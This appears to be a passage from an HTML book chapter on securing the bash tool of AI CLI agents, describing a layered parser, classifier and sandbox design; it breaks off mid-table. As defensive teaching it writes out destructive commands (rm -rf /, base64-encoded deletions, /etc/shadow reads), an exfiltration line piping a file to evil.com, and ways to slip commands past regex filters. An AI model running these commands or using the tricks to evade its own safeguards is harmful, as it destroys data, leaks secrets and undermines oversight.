@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 19: Bash Security Architecture — Architecting AI CLI Agents</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --card: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --orange: #d29922;
+  --red: #f85149;
+  --code-bg: #1c2128;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  font-size: 18px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+.container { max-width: 860px; margin: 0 auto; padding: 48px 24px 96px; }
+/* Navigation */
+.nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(13,17,23,0.95); backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 24px;
+  display: flex; justify-content: space-between; align-items: center;
+}
+.nav a { color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+.nav a:hover { text-decoration: underline; }
+.nav .title { color: var(--muted); font-size: 0.85rem; }
+/* Typography */
+h1 { font-size: 2.2rem; margin: 32px 0 16px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+h2 { font-size: 1.6rem; margin: 40px 0 16px; color: var(--accent); }
+h3 { font-size: 1.25rem; margin: 32px 0 12px; color: var(--text); }
+h4 { font-size: 1.1rem; margin: 24px 0 8px; color: var(--muted); }
+p { margin: 12px 0; }
+a { color: var(--accent); }
+strong { color: var(--text); }
+em { color: var(--muted); font-style: italic; }
+/* Lists */
+ul, ol { margin: 12px 0 12px 28px; }
+li { margin: 6px 0; }
+li > ul, li > ol { margin: 4px 0 4px 20px; }
+/* Code */
+code {
+  background: var(--code-bg); color: var(--green);
+  padding: 2px 6px; border-radius: 4px; font-size: 0.88em;
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+}
+pre {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; margin: 16px 0;
+  overflow-x: auto; line-height: 1.5;
+}
+pre code { background: none; padding: 0; color: var(--text); font-size: 0.85em; }
+/* Tables */
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.92em; }
+th { background: var(--card); color: var(--accent); text-align: left; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; }
+td { padding: 10px 14px; border: 1px solid var(--border); vertical-align: top; }
+tr:nth-child(even) { background: rgba(22,27,34,0.5); }
+/* Blockquotes */
+blockquote {
+  border-left: 3px solid var(--accent); margin: 16px 0;
+  padding: 12px 20px; background: var(--card); border-radius: 0 8px 8px 0;
+  color: var(--muted);
+}
+blockquote p { margin: 4px 0; }
+/* Mermaid */
+.mermaid { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin: 16px 0; text-align: center; }
+pre.mermaid-src { background: var(--card); border: 1px solid var(--border); white-space: pre-wrap; }
+/* Horizontal rules */
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+/* Chapter nav */
+.chapter-nav {
+  display: flex; justify-content: space-between; margin-top: 64px;
+  padding-top: 24px; border-top: 1px solid var(--border);
+}
+.chapter-nav a {
+  color: var(--accent); text-decoration: none; padding: 8px 16px;
+  border: 1px solid var(--border); border-radius: 8px; font-size: 0.9rem;
+}
+.chapter-nav a:hover { border-color: var(--accent); background: var(--card); }
+/* Responsive */
+@media (max-width: 768px) {
+  body { font-size: 16px; }
+  h1 { font-size: 1.6rem; }
+  h2 { font-size: 1.3rem; }
+  .container { padding: 24px 16px 64px; }
+  pre { padding: 12px; font-size: 0.8em; }
+  table { font-size: 0.82em; }
+  .nav { padding: 8px 16px; }
+}
+/* Syntax highlighting (Monokai-inspired) */
+.codehilite .k, .codehilite .kn, .codehilite .kd { color: #ff79c6; }
+.codehilite .s, .codehilite .s1, .codehilite .s2 { color: #f1fa8c; }
+.codehilite .n, .codehilite .na { color: #50fa7b; }
+.codehilite .c, .codehilite .c1, .codehilite .cm { color: #6272a4; font-style: italic; }
+.codehilite .nf, .codehilite .nb { color: #8be9fd; }
+.codehilite .mi, .codehilite .mf { color: #bd93f9; }
+.codehilite .o, .codehilite .p { color: #f8f8f2; }
+.codehilite .nx { color: #f8f8f2; }
+.codehilite .kr { color: #ff79c6; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({startOnLoad:true, theme:'dark'});</script>
+</head>
+<body>
+<nav class="nav">
+  <a href="index.html">&larr; Table of Contents</a>
+  <span class="title">Architecting AI CLI Agents</span>
+  <a href="chapter-20.html">Next &rarr;</a>
+</nav>
+<div class="container">
+<h1 id="chapter-19-bash-security-architecture">Chapter 19: Bash Security Architecture</h1>
+<p>Giving an AI agent a shell is like giving a teenager the car keys. The shell is the most powerful tool in a CLI agent's arsenal --- it can install packages, run tests, manage version control, deploy applications, and automate any task that a human could perform at the terminal. It is also the most dangerous. A single malformed command can delete the filesystem, exfiltrate credentials, install a backdoor, or brick the operating system. The shell is the tool where the gap between "useful" and "catastrophic" is narrowest.</p>
+<p>This chapter presents the architecture of a multi-layer security system for bash command execution in AI agents. We will examine why the shell is uniquely dangerous, why regex-based security fails, how to build a full shell parser for security analysis, the five security layers from parsing to sandbox enforcement, and the dangerous pattern categories that every CLI agent must detect. The design philosophy is defense-in-depth: any single layer can be bypassed, but all layers together are strong.</p>
+<hr />
+<h2 id="191-why-bash-is-the-primary-threat-vector">19.1 Why Bash Is the Primary Threat Vector</h2>
+<p>Before designing defenses, you must understand the threat. Bash is the primary attack surface for AI CLI agents for four reasons:</p>
+<p><strong>Reason 1: Turing-complete command construction.</strong> The shell is not a simple command dispatcher --- it is a programming language. Variable expansion, command substitution, process substitution, heredocs, brace expansion, arithmetic expansion, and quoting rules mean that the "command" the shell executes may look nothing like the string the agent produced.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># These all delete /etc/passwd:</span>
+rm<span class="w"> </span>/etc/passwd
+rm<span class="w"> </span>/etc/pass<span class="s1">&#39;w&#39;</span>d
+rm<span class="w"> </span>/etc/pass<span class="s2">&quot;&quot;</span>wd
+rm<span class="w"> </span><span class="s2">&quot;/etc/pass</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>w<span class="k">)</span><span class="s2">d&quot;</span>
+<span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;rm /etc/passwd&quot;</span>
+base64<span class="w"> </span>-d<span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">&#39;cm0gL2V0Yy9wYXNzd2Q=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
+</code></pre></div>
+
+<p><strong>Reason 2: Side effects are invisible.</strong> File reads and web fetches have clear, bounded effects. Shell commands can have arbitrary side effects: writing files, modifying environment variables, starting background processes, opening network connections, modifying cron jobs, and more --- all from a single line.</p>
+<p><strong>Reason 3: Chaining and piping.</strong> A single bash command can contain multiple operations chained with <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, <code>|</code>, or process substitution. The first half of the command may be benign, but the second half is destructive:</p>
+<div class="codehilite"><pre><span></span><code>git<span class="w"> </span>status<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                 </span><span class="c1"># Safe command chains to catastrophe</span>
+cat<span class="w"> </span>README.md<span class="w"> </span><span class="p">|</span><span class="w"> </span>curl<span class="w"> </span>-d<span class="w"> </span>@-<span class="w"> </span>evil.com<span class="w">    </span><span class="c1"># Read chains to exfiltration</span>
+</code></pre></div>
+
+<p><strong>Reason 4: Environment interaction.</strong> Shell commands inherit the user's full environment: PATH, aliases, shell functions, environment variables, and permissions. A command that is safe in isolation may be dangerous in a specific environment where <code>python</code> aliases to a compromised binary or PATH includes an attacker-controlled directory.</p>
+<hr />
+<h2 id="192-why-regex-based-security-fails">19.2 Why Regex-Based Security Fails</h2>
+<p>The naive approach to bash security is regex pattern matching: scan the command string for dangerous patterns and block matches. This approach fails for fundamental reasons.</p>
+<h3 id="encoding-and-escaping">Encoding and Escaping</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Pattern: block &quot;rm -rf /&quot;</span>
+rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                    </span><span class="c1"># Caught</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w">                  </span><span class="c1"># Missed (quotes)</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="w">                  </span><span class="c1"># Missed (double quotes)</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="se">\/</span><span class="w">                   </span><span class="c1"># Missed (escaped slash)</span>
+rm<span class="w"> </span>-r<span class="w"> </span>-f<span class="w"> </span>/<span class="w">                  </span><span class="c1"># Missed (split flags)</span>
+rm<span class="w"> </span>--recursive<span class="w"> </span>--force<span class="w"> </span>/<span class="w">    </span><span class="c1"># Missed (long flags)</span>
+<span class="se">\r</span>m<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                   </span><span class="c1"># Missed (escaped command name)</span>
+<span class="nb">command</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">            </span><span class="c1"># Missed (explicit command dispatch)</span>
+</code></pre></div>
+
+<p>Each evasion exploits a different shell feature. A regex would need to account for all of them, and new evasions are always possible.</p>
+<h3 id="aliasing-and-indirection">Aliasing and Indirection</h3>
+<div class="codehilite"><pre><span></span><code><span class="nb">alias</span><span class="w"> </span><span class="nv">please</span><span class="o">=</span><span class="s1">&#39;sudo&#39;</span>
+please<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">              </span><span class="c1"># Alias indirection</span>
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w">             </span><span class="c1"># Variable indirection</span>
+
+<span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">cm0gLXJmIC8</span><span class="o">=</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="k">)</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># Encoding indirection</span>
+</code></pre></div>
+
+<p>Regex cannot resolve aliases, expand variables, or decode base64. The command string says one thing; the shell does another.</p>
+<h3 id="compound-commands">Compound Commands</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># This is a single &quot;command&quot; with multiple operations:</span>
+<span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Building...&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/<span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>*<span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Subshell:</span>
+<span class="o">(</span><span class="nb">cd</span><span class="w"> </span>/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>*<span class="o">)</span>
+
+<span class="c1"># Command substitution:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="k">)</span><span class="s2">&quot;</span>
+
+<span class="c1"># Process substitution:</span>
+diff<span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>/etc/shadow<span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>/etc/passwd<span class="o">)</span>
+</code></pre></div>
+
+<p>Regex treats the string as flat text. The shell treats it as a structured program with scoping, grouping, and nesting. Flat text analysis cannot capture structural semantics.</p>
+<h3 id="the-fundamental-limitation">The Fundamental Limitation</h3>
+<p>Regex operates on the lexical surface of the command. Security requires understanding the semantic structure. The gap between "what the string looks like" and "what the shell will do" is the gap that attackers exploit. Closing this gap requires parsing the command into an AST and analyzing the AST --- the same approach that compilers use to understand source code.</p>
+<hr />
+<h2 id="193-the-five-layer-security-architecture">19.3 The Five-Layer Security Architecture</h2>
+<p>The bash security system uses five layers, each operating at a different level of abstraction:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">CMD</span><span class="p">[</span><span class="s">&quot;Bash Command String&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L1</span><span class="p">[</span><span class="s">&quot;Layer 1: PARSE&lt;br/&gt;Full shell parser → AST&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L1</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L2</span><span class="p">[</span><span class="s">&quot;Layer 2: AST ANALYSIS&lt;br/&gt;Classify command intent&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L2</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L3</span><span class="p">[</span><span class="s">&quot;Layer 3: PATTERN MATCHING&lt;br/&gt;50+ dangerous patterns&lt;br/&gt;across 8 categories&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L3</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L4</span><span class="p">[</span><span class="s">&quot;Layer 4: PERMISSION EVALUATION&lt;br/&gt;Per-command rule checking&lt;br/&gt;(Chapter 18)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L4</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">L5</span><span class="p">[</span><span class="s">&quot;Layer 5: SANDBOX ENFORCEMENT&lt;br/&gt;OS-level containment&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L5</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">EXEC</span><span class="p">[</span><span class="s">&quot;Execute Command&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">L1</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">L1N</span><span class="p">[</span><span class="s">&quot;Stops: syntax errors,&lt;br/&gt;malformed commands&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L2</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">L2N</span><span class="p">[</span><span class="s">&quot;Stops: disguised commands,&lt;br/&gt;indirect execution&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L3</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">L3N</span><span class="p">[</span><span class="s">&quot;Stops: known dangerous&lt;br/&gt;patterns by category&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L4</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">L4N</span><span class="p">[</span><span class="s">&quot;Stops: commands not&lt;br/&gt;approved by user/rules&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">L5</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">L5N</span><span class="p">[</span><span class="s">&quot;Stops: anything that&lt;br/&gt;escapes layers 1-4&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L1</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">4488</span><span class="n">cc</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L2</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="mi">44</span><span class="n">aa88</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L3</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">ccaa44</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="mo">000</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L4</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc8844</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">L5</span><span class="w"> </span><span class="n">fill</span><span class="o">:</span><span class="err">#</span><span class="n">cc4444</span><span class="p">,</span><span class="n">color</span><span class="o">:</span><span class="err">#</span><span class="n">fff</span>
+</code></pre></div>
+
+<p>Each layer catches threats that previous layers miss. This is the defense-in-depth principle: no single layer is sufficient, but together they cover the attack surface.</p>
+<hr />
+<h2 id="194-layer-1-full-shell-parsing">19.4 Layer 1: Full Shell Parsing</h2>
+<p>The first layer transforms the raw command string into a structured Abstract Syntax Tree (AST). This is the most technically demanding layer and the foundation that all other layers depend on.</p>
+<h3 id="why-a-full-parser">Why a Full Parser</h3>
+<p>A bash parser must handle:</p>
+<ul>
+<li><strong>Quoting rules:</strong> Single quotes (literal), double quotes (with expansion), dollar-single-quotes (ANSI-C)</li>
+<li><strong>Variable expansion:</strong> <code>$VAR</code>, <code>${VAR}</code>, <code>${VAR:-default}</code>, <code>${#VAR}</code></li>
+<li><strong>Command substitution:</strong> <code>$(command)</code>, <code>`command`</code></li>
+<li><strong>Arithmetic expansion:</strong> <code>$((expr))</code></li>
+<li><strong>Brace expansion:</strong> <code>{a,b,c}</code>, <code>{1..10}</code></li>
+<li><strong>Glob patterns:</strong> <code>*</code>, <code>?</code>, <code>[...]</code></li>
+<li><strong>Redirections:</strong> <code>&gt;</code>, <code>&gt;&gt;</code>, <code>2&gt;&amp;1</code>, <code>&amp;&gt;</code>, heredocs</li>
+<li><strong>Pipelines:</strong> <code>cmd1 | cmd2 | cmd3</code></li>
+<li><strong>Lists:</strong> <code>cmd1 &amp;&amp; cmd2</code>, <code>cmd1 || cmd2</code>, <code>cmd1 ; cmd2</code></li>
+<li><strong>Compound commands:</strong> <code>if/then/fi</code>, <code>for/do/done</code>, <code>while/do/done</code>, <code>{ group; }</code>, <code>(subshell)</code></li>
+<li><strong>Functions:</strong> <code>name() { body; }</code></li>
+<li><strong>Coprocesses:</strong> <code>coproc cmd</code></li>
+<li><strong>Heredocs:</strong> <code>&lt;&lt;EOF ... EOF</code>, <code>&lt;&lt;'EOF' ... EOF</code> (with and without expansion)</li>
+</ul>
+<p>A production shell parser runs to 2,000-5,000 lines depending on the language and how many edge cases it handles. This is a significant engineering investment, but there is no shortcut: every feature the parser does not handle is a feature that attackers can use for evasion.</p>
+<h3 id="the-ast-structure">The AST Structure</h3>
+<p>The parser produces an AST with node types that correspond to shell constructs:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">AST</span><span class="w"> </span><span class="nx">Node</span><span class="w"> </span><span class="nx">Types</span><span class="p">:</span>
+<span class="w">  </span><span class="nx">SimpleCommand</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;git status&quot;</span><span class="w"> </span><span class="p">(</span><span class="nx">a</span><span class="w"> </span><span class="nx">single</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">arguments</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Pipeline</span><span class="w">         </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;cmd1 | cmd2&quot;</span><span class="w"> </span><span class="p">(</span><span class="nx">piped</span><span class="w"> </span><span class="nx">commands</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">List</span><span class="w">             </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;cmd1 &amp;&amp; cmd2&quot;</span><span class="w"> </span><span class="p">(</span><span class="nx">conditional</span><span class="o">/</span><span class="nx">sequential</span><span class="w"> </span><span class="nx">commands</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Subshell</span><span class="w">         </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;(cmd)&quot;</span><span class="w"> </span><span class="p">(</span><span class="nx">commands</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">subshell</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Group</span><span class="w">            </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;{ cmd; }&quot;</span><span class="w"> </span><span class="p">(</span><span class="nx">grouped</span><span class="w"> </span><span class="nx">commands</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">shell</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">If</span><span class="w">               </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;if cmd; then cmd; fi&quot;</span>
+<span class="w">  </span><span class="nx">For</span><span class="w">              </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;for x in list; do cmd; done&quot;</span>
+<span class="w">  </span><span class="nx">While</span><span class="w">            </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;while cmd; do cmd; done&quot;</span>
+<span class="w">  </span><span class="nx">Function</span><span class="w">         </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;name() { cmd; }&quot;</span>
+<span class="w">  </span><span class="nx">Redirection</span><span class="w">      </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;&gt; file&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;2&gt;&amp;1&quot;</span>
+<span class="w">  </span><span class="nx">Assignment</span><span class="w">       </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;VAR=value&quot;</span>
+<span class="w">  </span><span class="nx">CommandSubst</span><span class="w">     </span><span class="err">→</span><span class="w"> </span><span class="s">&quot;$(cmd)&quot;</span>
+</code></pre></div>
+
+<p>The critical property of the AST is that it makes the command's structure explicit. <code>echo "safe" &amp;&amp; rm -rf /</code> as text looks like a single command. As an AST, it is clearly a <code>List</code> with two <code>SimpleCommand</code> children, and the second child is analyzed independently.</p>
+<h3 id="parse-failure-policy">Parse Failure Policy</h3>
+<p>What happens when the parser cannot parse a command? This is a critical design decision:</p>
+<p><strong>Option A: Block unparseable commands.</strong> Safe, but prevents legitimate commands that use shell features the parser does not handle.</p>
+<p><strong>Option B: Allow unparseable commands with a warning.</strong> Permissive, but opens a bypass vector: craft commands that are valid bash but confuse the parser.</p>
+<p><strong>Option C: Allow unparseable commands but skip AST-based analysis, relying on pattern matching and sandboxing.</strong> This is the pragmatic middle ground. The command bypasses Layer 2 (AST analysis) but still goes through Layer 3 (pattern matching), Layer 4 (permissions), and Layer 5 (sandbox). This accepts a narrower security margin for commands the parser cannot handle while maintaining the baseline protection.</p>
+<p>Most production implementations choose Option C, because bash's syntax is vast enough that no parser handles 100% of valid commands. The key is measuring: track how many commands fail parsing in production and improve the parser to cover common failure patterns.</p>
+<hr />
+<h2 id="195-layer-2-ast-analysis">19.5 Layer 2: AST Analysis</h2>
+<p>With the command parsed into an AST, Layer 2 classifies the intent of each command node. This is where the system reasons about what the command does, not just what it looks like.</p>
+<h3 id="command-classification">Command Classification</h3>
+<p>Each <code>SimpleCommand</code> node is classified into a risk category:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">graph</span><span class="w"> </span><span class="nx">TD</span>
+<span class="w">    </span><span class="nx">CMD</span><span class="p">[</span><span class="s">&quot;SimpleCommand Node&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">Resolve</span><span class="p">[</span><span class="s">&quot;Resolve command name&lt;br/&gt;(strip quoting, follow aliases)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Resolve</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">Classify</span><span class="p">{</span><span class="s">&quot;Classify by&lt;br/&gt;command name&quot;</span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;ls, cat, echo, pwd&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">RO</span><span class="p">[</span><span class="s">&quot;READ-ONLY&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;git, cargo, npm, python&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">DT</span><span class="p">[</span><span class="s">&quot;DEV-TOOL&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;pip install, npm install&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">WR</span><span class="p">[</span><span class="s">&quot;WRITE&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;sudo, chmod, chown&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">SM</span><span class="p">[</span><span class="s">&quot;SYSTEM-MODIFY&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;rm -rf, dd, mkfs&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">DE</span><span class="p">[</span><span class="s">&quot;DESTRUCTIVE&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;eval, source, exec&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">IN</span><span class="p">[</span><span class="s">&quot;INDIRECT&lt;br/&gt;(analyze argument)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">Classify</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="nx">unknown</span><span class="o">|</span><span class="w"> </span><span class="nx">UN</span><span class="p">[</span><span class="s">&quot;UNKNOWN&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">RO</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="mi">44</span><span class="nx">cc44</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="mi">000</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">DT</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="mi">88</span><span class="nx">cc44</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="mi">000</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">WR</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="nx">cccc44</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="mi">000</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">SM</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="nx">cc8844</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="nx">fff</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">DE</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="nx">cc4444</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="nx">fff</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="mi">8844</span><span class="nx">cc</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="nx">fff</span>
+<span class="w">    </span><span class="nx">style</span><span class="w"> </span><span class="nx">UN</span><span class="w"> </span><span class="nx">fill</span><span class="p">:</span><span class="err">#</span><span class="mi">888888</span><span class="p">,</span><span class="nx">color</span><span class="p">:</span><span class="err">#</span><span class="nx">fff</span>
+</code></pre></div>
+
+<h3 id="indirect-execution-analysis">Indirect Execution Analysis</h3>
+<p>The most architecturally interesting classification is <code>INDIRECT</code> --- commands that execute other commands:</p>
+<table>
+<thead>
+<tr>
+<th>Indirect Command</th>
+<th>What It Does</th>
+<th>Analysis Required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>eval "$CMD"</code></td>
+<td>Evaluates string as shell code</td>
+<td>Must analyze the string content</td>
+</tr>
+<tr>
+<td><code>source script.sh</code></td>
+<td>Executes file in current shell</td>
+<td>Must analyze file contents (or block)</td>
+</tr>
+<tr>
+<td><code>exec cmd</code></td>
+<td>Replaces current process</td>
+<td>Must classify the replacement command</td>
+</tr>
+<tr>
+<td><code>xargs cmd</code></td>
+<td>Executes cmd with piped arguments</td>
+<td>Must classify the base command</td>
+</tr>
+<tr>
+<td><code>bash -c "cmd"</code></td>
+<td>Runs cmd in new shell</td>
+<td>Must recursively parse and analyze</td>
+</tr>
+<tr>
